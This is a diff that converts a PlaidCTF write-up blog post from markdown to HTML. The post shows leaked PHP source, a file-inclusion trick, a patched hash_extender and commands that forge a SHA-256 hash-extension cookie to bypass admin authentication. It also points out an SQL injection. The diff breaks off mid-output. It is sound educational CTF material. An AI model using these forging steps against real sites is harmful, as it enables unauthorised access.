@@ -14,99 +14,100 @@ categories:
 
 Hey folks,
 
-This is going to be my first of a couple writeups about this past weekend's CTF: [PlaidCTF](http://www.plaidctf.com)!
+This is going to be my first of a couple writeups about this past weekend's CTF: <a href='http://www.plaidctf.com'>PlaidCTF</a>!
 
-My first writeup is for a 150-point Web level called mtpox. I chose this one to do first not only because it's the first level I completed, but also because the primary vulnerability was a hash extension issue, and I wrote one of [most popular tools](https://github.com/iagox86/hash_extender) for exploiting those. So it's like the level made for me!
+My first writeup is for a 150-point Web level called mtpox. I chose this one to do first not only because it's the first level I completed, but also because the primary vulnerability was a hash extension issue, and I wrote one of <a href='https://github.com/iagox86/hash_extender'>most popular tools</a> for exploiting those. So it's like the level made for me!
 
-(Actually, there's another level that I wrote a less popular tool for. I'll talk about that one in my next post. :) )  
-  
-Just for fun, here's an activity graph on github for the weekend:  
-![](https://blogdata.skullsecurity.org/hash_extender_downloads.png)
+(Actually, there's another level that I wrote a less popular tool for. I'll talk about that one in my next post. :) )
+<!--more-->
+Just for fun, here's an activity graph on github for the weekend:
+<img src='https://blogdata.skullsecurity.org/hash_extender_downloads.png'>
 
 Lots of traffic!
 
-## Step 1: source code disclosure
+<h2>Step 1: source code disclosure</h2>
 
-So, I actually didn't solve this part, I was still trying to get access to PlaidCTF while my teammate [Andrew Orr](https://twitter.com/xorrbit) solved it.
+So, I actually didn't solve this part, I was still trying to get access to PlaidCTF while my teammate <a href='https://twitter.com/xorrbit'>Andrew Orr</a> solved it.
 
 Basically, you arrive at a site and browse around:
-
-- http://54.211.6.40/index.php
-- http://54.211.6.40/index.php?page=about
-- ...etc.
+<ul>
+  <li>http://54.211.6.40/index.php</li>
+  <li>http://54.211.6.40/index.php?page=about</li>
+  <li>...etc.</li>
+</ul>
 
 (Note that those IP addresses won't work for long, they might add new ones for a few days after the competition, then they're gone forever)
 
 There's also an interesting link at the top:
-
-- http://54.211.6.40/admin.php
+<ul>
+  <li>http://54.211.6.40/admin.php</li>
+</ul>
 
 Which, when clicked, says "Sorry, not authorized". I guess we have to get authorized!
 
 What Andrew discovered is that you can modify the ?page= request parameter to read the admin.php page:
 
-- http://54.211.6.40/?page=admin.php
+<ul>
+  <li>http://54.211.6.40/?page=admin.php</li>
+</ul>
 
 Which returns:
 
-```
-
-<span class="Special"><?php</span>
-  <span class="PreProc">require_once</span><span class="Special">(</span>"<span class="Constant">secrets.php</span>"<span class="Special">)</span>;
+<pre>
+<span class="Special">&lt;?php</span>
+  <span class="PreProc">require_once</span><span class="Special">(</span>&quot;<span class="Constant">secrets.php</span>&quot;<span class="Special">)</span>;
   <span class="Statement">$</span><span class="Identifier">auth</span> <span class="Statement">=</span> <span class="Constant">false</span>;
-  <span class="Statement">if</span> <span class="Special">(</span><span class="Statement">isset</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">_COOKIE</span><span class="Special">[</span>"<span class="Constant">auth</span>"<span class="Special">]))</span> <span class="Special">{</span>
-     <span class="Statement">$</span><span class="Identifier">auth</span> <span class="Statement">=</span> <span class="Identifier">unserialize</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">_COOKIE</span><span class="Special">[</span>"<span class="Constant">auth</span>"<span class="Special">])</span>;
-     <span class="Statement">$</span><span class="Identifier">hsh</span> <span class="Statement">=</span> <span class="Statement">$</span><span class="Identifier">_COOKIE</span><span class="Special">[</span>"<span class="Constant">hsh</span>"<span class="Special">]</span>;
-     <span class="Statement">if</span> <span class="Special">(</span><span class="Statement">$</span><span class="Identifier">hsh</span> <span class="Statement">!==</span> hash<span class="Special">(</span>"<span class="Constant">sha256</span>", <span class="Statement">$</span><span class="Identifier">SECRET</span> <span class="Statement">.</span> <span class="Identifier">strrev</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">_COOKIE</span><span class="Special">[</span>"<span class="Constant">auth</span>"<span class="Special">])))</span> <span class="Special">{</span>
+  <span class="Statement">if</span> <span class="Special">(</span><span class="Statement">isset</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">_COOKIE</span><span class="Special">[</span>&quot;<span class="Constant">auth</span>&quot;<span class="Special">]))</span> <span class="Special">{</span>
+     <span class="Statement">$</span><span class="Identifier">auth</span> <span class="Statement">=</span> <span class="Identifier">unserialize</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">_COOKIE</span><span class="Special">[</span>&quot;<span class="Constant">auth</span>&quot;<span class="Special">])</span>;
+     <span class="Statement">$</span><span class="Identifier">hsh</span> <span class="Statement">=</span> <span class="Statement">$</span><span class="Identifier">_COOKIE</span><span class="Special">[</span>&quot;<span class="Constant">hsh</span>&quot;<span class="Special">]</span>;
+     <span class="Statement">if</span> <span class="Special">(</span><span class="Statement">$</span><span class="Identifier">hsh</span> <span class="Statement">!==</span> hash<span class="Special">(</span>&quot;<span class="Constant">sha256</span>&quot;, <span class="Statement">$</span><span class="Identifier">SECRET</span> <span class="Statement">.</span> <span class="Identifier">strrev</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">_COOKIE</span><span class="Special">[</span>&quot;<span class="Constant">auth</span>&quot;<span class="Special">])))</span> <span class="Special">{</span>
        <span class="Statement">$</span><span class="Identifier">auth</span> <span class="Statement">=</span> <span class="Constant">false</span>;
      <span class="Special">}</span>
   <span class="Special">}</span>
   <span class="Statement">else</span> <span class="Special">{</span>
     <span class="Statement">$</span><span class="Identifier">auth</span> <span class="Statement">=</span> <span class="Constant">false</span>;
     <span class="Statement">$</span><span class="Identifier">s</span> <span class="Statement">=</span> <span class="Identifier">serialize</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">auth</span><span class="Special">)</span>;
-    <span class="Identifier">setcookie</span><span class="Special">(</span>"<span class="Constant">auth</span>", <span class="Statement">$</span><span class="Identifier">s</span><span class="Special">)</span>;
-    <span class="Identifier">setcookie</span><span class="Special">(</span>"<span class="Constant">hsh</span>", hash<span class="Special">(</span>"<span class="Constant">sha256</span>", <span class="Statement">$</span><span class="Identifier">SECRET</span> <span class="Statement">.</span> <span class="Identifier">strrev</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">s</span><span class="Special">)))</span>;
+    <span class="Identifier">setcookie</span><span class="Special">(</span>&quot;<span class="Constant">auth</span>&quot;, <span class="Statement">$</span><span class="Identifier">s</span><span class="Special">)</span>;
+    <span class="Identifier">setcookie</span><span class="Special">(</span>&quot;<span class="Constant">hsh</span>&quot;, hash<span class="Special">(</span>&quot;<span class="Constant">sha256</span>&quot;, <span class="Statement">$</span><span class="Identifier">SECRET</span> <span class="Statement">.</span> <span class="Identifier">strrev</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">s</span><span class="Special">)))</span>;
   <span class="Special">}</span>
   <span class="Statement">if</span> <span class="Special">(</span><span class="Statement">$</span><span class="Identifier">auth</span><span class="Special">)</span> <span class="Special">{</span>
     <span class="Statement">if</span> <span class="Special">(</span><span class="Statement">isset</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">_GET</span><span class="Special">[</span>'<span class="Constant">query</span>'<span class="Special">]))</span> <span class="Special">{</span>
       <span class="Statement">$</span><span class="Identifier">link</span> <span class="Statement">=</span> <span class="Identifier">mysql_connect</span><span class="Special">(</span>'<span class="Constant">localhost</span>', <span class="Statement">$</span><span class="Identifier">SQL_USER</span>, <span class="Statement">$</span><span class="Identifier">SQL_PASSWORD</span><span class="Special">)</span> <span class="Statement">or</span> <span class="Statement">die</span><span class="Special">(</span>'<span class="Constant">Could not connect: </span>' <span class="Statement">.</span> <span class="Identifier">mysql_error</span><span class="Special">())</span>;
       <span class="Identifier">mysql_select_db</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">SQL_DATABASE</span><span class="Special">)</span> <span class="Statement">or</span> <span class="Statement">die</span><span class="Special">(</span>'<span class="Constant">Could not select database</span>'<span class="Special">)</span>;
       <span class="Statement">$</span><span class="Identifier">qstr</span> <span class="Statement">=</span> <span class="Identifier">mysql_real_escape_string</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">_GET</span><span class="Special">[</span>'<span class="Constant">query</span>'<span class="Special">])</span>;
-      <span class="Statement">$</span><span class="Identifier">query</span> <span class="Statement">=</span> "<span class="Constant">SELECT amount FROM plaidcoin_wallets WHERE id=</span><span class="Statement">$</span><span class="Identifier">qstr</span>";
+      <span class="Statement">$</span><span class="Identifier">query</span> <span class="Statement">=</span> &quot;<span class="Constant">SELECT amount FROM plaidcoin_wallets WHERE id=</span><span class="Statement">$</span><span class="Identifier">qstr</span>&quot;;
       <span class="Statement">$</span><span class="Identifier">result</span> <span class="Statement">=</span> <span class="Identifier">mysql_query</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">query</span><span class="Special">)</span> <span class="Statement">or</span> <span class="Statement">die</span><span class="Special">(</span>'<span class="Constant">Query failed: </span>' <span class="Statement">.</span> <span class="Identifier">mysql_error</span><span class="Special">())</span>;
       <span class="Statement">$</span><span class="Identifier">line</span> <span class="Statement">=</span> <span class="Identifier">mysql_fetch_array</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">result</span>, MYSQL_ASSOC<span class="Special">)</span>;
       <span class="Statement">foreach</span> <span class="Special">(</span><span class="Statement">$</span><span class="Identifier">line</span> <span class="Statement">as</span> <span class="Statement">$</span><span class="Identifier">col_value</span><span class="Special">)</span> <span class="Special">{</span>
-        <span class="PreProc">echo</span> "<span class="Constant">Wallet </span>" <span class="Statement">.</span> <span class="Statement">$</span><span class="Identifier">_GET</span><span class="Special">[</span>'<span class="Constant">query</span>'<span class="Special">]</span> <span class="Statement">.</span> "<span class="Constant"> contains </span>" <span class="Statement">.</span> <span class="Statement">$</span><span class="Identifier">col_value</span> <span class="Statement">.</span> "<span class="Constant"> coins.</span>";
+        <span class="PreProc">echo</span> &quot;<span class="Constant">Wallet </span>&quot; <span class="Statement">.</span> <span class="Statement">$</span><span class="Identifier">_GET</span><span class="Special">[</span>'<span class="Constant">query</span>'<span class="Special">]</span> <span class="Statement">.</span> &quot;<span class="Constant"> contains </span>&quot; <span class="Statement">.</span> <span class="Statement">$</span><span class="Identifier">col_value</span> <span class="Statement">.</span> &quot;<span class="Constant"> coins.</span>&quot;;
       <span class="Special">}</span>
     <span class="Special">}</span> <span class="Statement">else</span> <span class="Special">{</span>
-       <span class="PreProc">echo</span> "<span class="Constant"><html><head><title>MtPOX Admin Page</title></head><body>Welcome to the admin panel!<br /><br /><form name='input' action='admin.php' method='get'>Wallet ID: <input type='text' name='query'><input type='submit' value='Submit Query'></form></body></html></span>";
+       <span class="PreProc">echo</span> &quot;<span class="Constant">&lt;html&gt;&lt;head&gt;&lt;title&gt;MtPOX Admin Page&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Welcome to the admin panel!&lt;br /&gt;&lt;br /&gt;&lt;form name='input' action='admin.php' method='get'&gt;Wallet ID: &lt;input type='text' name='query'&gt;&lt;input type='submit' value='Submit Query'&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</span>&quot;;
     <span class="Special">}</span>
   <span class="Special">}</span>
-  <span class="Statement">else</span> <span class="PreProc">echo</span> "<span class="Constant">Sorry, not authorized.</span>";
-<span class="Special">?></span>
-```
+  <span class="Statement">else</span> <span class="PreProc">echo</span> &quot;<span class="Constant">Sorry, not authorized.</span>&quot;;
+<span class="Special">?&gt;</span>
+</pre>
 
 There is an obvious SQL Injection vulnerability here:
 
-```
-
+<pre>
       <span class="Identifier">mysql_select_db</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">SQL_DATABASE</span><span class="Special">)</span> <span class="Statement">or</span> <span class="Statement">die</span><span class="Special">(</span>'<span class="Constant">Could not select database</span>'<span class="Special">)</span>;
       <span class="Statement">$</span><span class="Identifier">qstr</span> <span class="Statement">=</span> <span class="Identifier">mysql_real_escape_string</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">_GET</span><span class="Special">[</span>'<span class="Constant">query</span>'<span class="Special">])</span>;
-      <span class="Statement">$</span><span class="Identifier">query</span> <span class="Statement">=</span> "<span class="Constant">SELECT amount FROM plaidcoin_wallets WHERE id=</span><span class="Statement">$</span><span class="Identifier">qstr</span>";
-```
+      <span class="Statement">$</span><span class="Identifier">query</span> <span class="Statement">=</span> &quot;<span class="Constant">SELECT amount FROM plaidcoin_wallets WHERE id=</span><span class="Statement">$</span><span class="Identifier">qstr</span>&quot;;
+</pre>
 
 ... which I'll cover at the end, but first we need to access the page!
 
-## In comes hash extension
+<h2>In comes hash extension</h2>
 
-If you've never heard of hash extension attacks, check out [the blog I wrote about them](/2012/everything-you-need-to-know-about-hash-length-extension-attacks) —it's the most popular non-Wikipedia result on Google (just sayin' :) ). I'm not going to go over the attacks in general, that page does a pretty thorough job of it. Please check it out if you get lost!
+If you've never heard of hash extension attacks, check out <a href='/2012/everything-you-need-to-know-about-hash-length-extension-attacks'>the blog I wrote about them</a> &mdash;it's the most popular non-Wikipedia result on Google (just sayin' :) ). I'm not going to go over the attacks in general, that page does a pretty thorough job of it. Please check it out if you get lost!
 
 Anyway, the second I saw this line:
 
-```
-
-     <span class="Statement">if</span> <span class="Special">(</span><span class="Statement">$</span><span class="Identifier">hsh</span> <span class="Statement">!==</span> hash<span class="Special">(</span>"<span class="Constant">sha256</span>", <span class="Statement">$</span><span class="Identifier">SECRET</span> <span class="Statement">.</span> <span class="Identifier">strrev</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">_COOKIE</span><span class="Special">[</span>"<span class="Constant">auth</span>"<span class="Special">])))</span> <span class="Special">{</span>
-```
+<pre>
+     <span class="Statement">if</span> <span class="Special">(</span><span class="Statement">$</span><span class="Identifier">hsh</span> <span class="Statement">!==</span> hash<span class="Special">(</span>&quot;<span class="Constant">sha256</span>&quot;, <span class="Statement">$</span><span class="Identifier">SECRET</span> <span class="Statement">.</span> <span class="Identifier">strrev</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">_COOKIE</span><span class="Special">[</span>&quot;<span class="Constant">auth</span>&quot;<span class="Special">])))</span> <span class="Special">{</span>
+</pre>
 
 I immediately recognized the hash extension vulnerablity. If you ever see somebody concatenating a secret with something in a hashing function, consider hash extension.
 
@@ -114,45 +115,44 @@ Great, so what's that mean? It means that I can add arbitrary data to the end of
 
 Well, to understand that, we have to first understand how the authentication works for this site.
 
-When you visit for the first time—with no cookie—this code executes:
+When you visit for the first time&mdash;with no cookie&mdash;this code executes:
 
-```
-
+<pre>
     <span class="Statement">$</span><span class="Identifier">auth</span> <span class="Statement">=</span> <span class="Constant">false</span>;
     <span class="Statement">$</span><span class="Identifier">s</span> <span class="Statement">=</span> <span class="Identifier">serialize</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">auth</span><span class="Special">)</span>;
-    <span class="Identifier">setcookie</span><span class="Special">(</span>"<span class="Constant">auth</span>", <span class="Statement">$</span><span class="Identifier">s</span><span class="Special">)</span>;
-    <span class="Identifier">setcookie</span><span class="Special">(</span>"<span class="Constant">hsh</span>", hash<span class="Special">(</span>"<span class="Constant">sha256</span>", <span class="Statement">$</span><span class="Identifier">SECRET</span> <span class="Statement">.</span> <span class="Identifier">strrev</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">s</span><span class="Special">)))</span>;
-```
+    <span class="Identifier">setcookie</span><span class="Special">(</span>&quot;<span class="Constant">auth</span>&quot;, <span class="Statement">$</span><span class="Identifier">s</span><span class="Special">)</span>;
+    <span class="Identifier">setcookie</span><span class="Special">(</span>&quot;<span class="Constant">hsh</span>&quot;, hash<span class="Special">(</span>&quot;<span class="Constant">sha256</span>&quot;, <span class="Statement">$</span><span class="Identifier">SECRET</span> <span class="Statement">.</span> <span class="Identifier">strrev</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">s</span><span class="Special">)))</span>;
+</pre>
 
 Your cookie is a serialized PHP datatype, in this case simply 'false'. The hsh token is generated by prepending a secret to the reversed version of the authentication string (and btw, I really appreciate that they decided to reverse it; this would have been difficult or impossible otherwise!)
 
 Those two cookies are set. Then later, when you return, the cookies are sent back and validated:
 
-```
-
-  <span class="Statement">if</span> <span class="Special">(</span><span class="Statement">isset</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">_COOKIE</span><span class="Special">[</span>"<span class="Constant">auth</span>"<span class="Special">]))</span> <span class="Special">{</span>
-     <span class="Statement">$</span><span class="Identifier">auth</span> <span class="Statement">=</span> <span class="Identifier">unserialize</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">_COOKIE</span><span class="Special">[</span>"<span class="Constant">auth</span>"<span class="Special">])</span>;
-     <span class="Statement">$</span><span class="Identifier">hsh</span> <span class="Statement">=</span> <span class="Statement">$</span><span class="Identifier">_COOKIE</span><span class="Special">[</span>"<span class="Constant">hsh</span>"<span class="Special">]</span>;
-     <span class="Statement">if</span> <span class="Special">(</span><span class="Statement">$</span><span class="Identifier">hsh</span> <span class="Statement">!==</span> hash<span class="Special">(</span>"<span class="Constant">sha256</span>", <span class="Statement">$</span><span class="Identifier">SECRET</span> <span class="Statement">.</span> <span class="Identifier">strrev</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">_COOKIE</span><span class="Special">[</span>"<span class="Constant">auth</span>"<span class="Special">])))</span> <span class="Special">{</span>
+<pre>
+  <span class="Statement">if</span> <span class="Special">(</span><span class="Statement">isset</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">_COOKIE</span><span class="Special">[</span>&quot;<span class="Constant">auth</span>&quot;<span class="Special">]))</span> <span class="Special">{</span>
+     <span class="Statement">$</span><span class="Identifier">auth</span> <span class="Statement">=</span> <span class="Identifier">unserialize</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">_COOKIE</span><span class="Special">[</span>&quot;<span class="Constant">auth</span>&quot;<span class="Special">])</span>;
+     <span class="Statement">$</span><span class="Identifier">hsh</span> <span class="Statement">=</span> <span class="Statement">$</span><span class="Identifier">_COOKIE</span><span class="Special">[</span>&quot;<span class="Constant">hsh</span>&quot;<span class="Special">]</span>;
+     <span class="Statement">if</span> <span class="Special">(</span><span class="Statement">$</span><span class="Identifier">hsh</span> <span class="Statement">!==</span> hash<span class="Special">(</span>&quot;<span class="Constant">sha256</span>&quot;, <span class="Statement">$</span><span class="Identifier">SECRET</span> <span class="Statement">.</span> <span class="Identifier">strrev</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">_COOKIE</span><span class="Special">[</span>&quot;<span class="Constant">auth</span>&quot;<span class="Special">])))</span> <span class="Special">{</span>
        <span class="Statement">$</span><span class="Identifier">auth</span> <span class="Statement">=</span> <span class="Constant">false</span>;
      <span class="Special">}</span>
-```
+</pre>
 
 $auth is read from the token, then the token is validated. If the validation fails, it's set to false.
 
-## Creating a valid token
+<h2>Creating a valid token</h2>
 
-Basically, I want to make my token deserialize to 'true', somehow, then generate a proper checksum for it. First, let's look at the cookies it sets! I used the [Firefox](https://addons.mozilla.org/en-US/firefox/addon/web-developer/) plugin for this, because it makes it easy to view and edit cookies. But you can use any technique you want for that. I find out that my cookies for mtpox are:
+Basically, I want to make my token deserialize to 'true', somehow, then generate a proper checksum for it. First, let's look at the cookies it sets! I used the <a href='https://addons.mozilla.org/en-US/firefox/addon/web-developer/'>Firefox</a> plugin for this, because it makes it easy to view and edit cookies. But you can use any technique you want for that. I find out that my cookies for mtpox are:
 
-- auth=b%3A0%3B
-- hsh=ef16c2bffbcf0b7567217f292f9c2a9a50885e01e002fa34db34c0bb916ed5c3
+<ul>
+  <li>auth=b%3A0%3B</li>
+  <li>hsh=ef16c2bffbcf0b7567217f292f9c2a9a50885e01e002fa34db34c0bb916ed5c3</li>
+</ul>
 
-b%3A0%3B actually decodes to "b:0;". Boolean zero (false). The true value will be "b:1;". That's the value I want to append. The one important thing I \*don't\* know is the length of $SECRET, which is unfortunately important for this attack. But, I can bruteforce that!
+b%3A0%3B actually decodes to "b:0;". Boolean zero (false). The true value will be "b:1;". That's the value I want to append. The one important thing I *don't* know is the length of $SECRET, which is unfortunately important for this attack. But, I can bruteforce that!
 
-But before I do anything, I need to tweak hash\_extender a little bit, because this challenge requires the string to be reversed before being validated. After all, it wouldn't be a proper CTF if existent tools could do everything! Here's the diff against the latest git version:
+But before I do anything, I need to tweak hash_extender a little bit, because this challenge requires the string to be reversed before being validated. After all, it wouldn't be a proper CTF if existent tools could do everything! Here's the diff against the latest git version:
 
-```
-
+<pre>
 <span class="Type">diff --git a/hash_extender.c b/hash_extender.c</span>
 index 408a4ca..370e52c 100644
 <span class="Type">--- a/hash_extender.c</span>
@@ -161,44 +161,42 @@ index 408a4ca..370e52c 100644
    }
    else
    {
-<span class="Special">-    printf("Type: %s\n", type);</span>
+<span class="Special">-    printf(&quot;Type: %s\n&quot;, type);</span>
 <span class="Statement">+    uint8_t reversed[new_data_length];</span>
 <span class="Statement">+    int i;</span>
 
-<span class="Special">-    printf("Secret length: %"PRId64"\n", secret_length);</span>
-<span class="Statement">+    for(i = 0; i < new_data_length; i++)</span>
+<span class="Special">-    printf(&quot;Secret length: %&quot;PRId64&quot;\n&quot;, secret_length);</span>
+<span class="Statement">+    for(i = 0; i &lt; new_data_length; i++)</span>
 <span class="Statement">+      reversed[new_data_length - i - 1] = new_data[i];</span>
 
-<span class="Special">-    printf("New signature: ");</span>
-     output_format(options->out_signature_format, new_signature, hash_type_digest_size(type));
-<span class="Special">-    printf("\n");</span>
+<span class="Special">-    printf(&quot;New signature: &quot;);</span>
+     output_format(options-&gt;out_signature_format, new_signature, hash_type_digest_size(type));
+<span class="Special">-    printf(&quot;\n&quot;);</span>
 <span class="Special">-</span>
-<span class="Special">-    printf("New string: ");</span>
-<span class="Special">-    output_format(options->out_data_format, new_data, new_data_length);</span>
-<span class="Special">-    printf("\n");</span>
+<span class="Special">-    printf(&quot;New string: &quot;);</span>
+<span class="Special">-    output_format(options-&gt;out_data_format, new_data, new_data_length);</span>
+<span class="Special">-    printf(&quot;\n&quot;);</span>
 <span class="Special">-</span>
-<span class="Statement">+    printf(",");</span>
-<span class="Statement">+    output_format(options->out_data_format, reversed, new_data_length);</span>
-     printf("\n");
+<span class="Statement">+    printf(&quot;,&quot;);</span>
+<span class="Statement">+    output_format(options-&gt;out_data_format, reversed, new_data_length);</span>
+     printf(&quot;\n&quot;);
    }
  }
-```
+</pre>
 
-Basically, we just reverse the string first, and tweak the output to make it easier to script. Then, we run hash\_extender like this:
+Basically, we just reverse the string first, and tweak the output to make it easier to script. Then, we run hash_extender like this:
 
-```
-
+<pre>
 ./hash_extender --data <span class="Statement">'</span><span class="Constant">;0:b</span><span class="Statement">'</span> -s ef16c2bffbcf0b7567217f292f9c2a9a50885e01e002fa34db34c0bb916ed5c3 --append <span class="Statement">'</span><span class="Constant">;1:b</span><span class="Statement">'</span> --secret-min<span class="Statement">=</span><span class="Constant">1</span> --secret-max<span class="Statement">=</span><span class="Constant">32</span> --out-data-format<span class="Statement">=</span>html
-```
+</pre>
 
 This tells it to try every secret length between 1 and 32 bytes. One of them is bound to work!
 
-<UPDATE> Thanks to an anonymous commenter who informed me that PlaidCTF actually tells us what the length of $SECRET was. The main Web site was down for the whole time I was working on this level (it was right at the start), so I never actually read the description :(
+&lt;UPDATE&gt; Thanks to an anonymous commenter who informed me that PlaidCTF actually tells us what the length of $SECRET was. The main Web site was down for the whole time I was working on this level (it was right at the start), so I never actually read the description :(
 
 Here's what it looks like running:
 
-```
-
+<pre>
 $ ./hash_extender --data <span class="Statement">'</span><span class="Constant">;0:b</span><span class="Statement">'</span> -s ef16c2bffbcf0b7567217f292f9c2a9a50885e01e002fa34db34c0bb916ed5c3 --append <span class="Statement">'</span><span class="Constant">;1:b</span><span class="Statement">'</span> --secret-min<span class="Statement">=</span><span class="Constant">1</span> --secret-max<span class="Statement">=</span><span class="Constant">32</span> --out-data-format<span class="Statement">=</span>html
 967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1,b%3a1%3b%<span class="Constant">28</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%80b%3a0%3b
 967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1,b%3a1%3b0%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%80b%3a0%3b
@@ -207,22 +205,20 @@ $ ./hash_extender --data <span class="Statement">'</span><span class="Constant">
 967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1,b%3a1%3bH%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%80b%3a0%3b
 967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1,b%3a1%3bP%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span 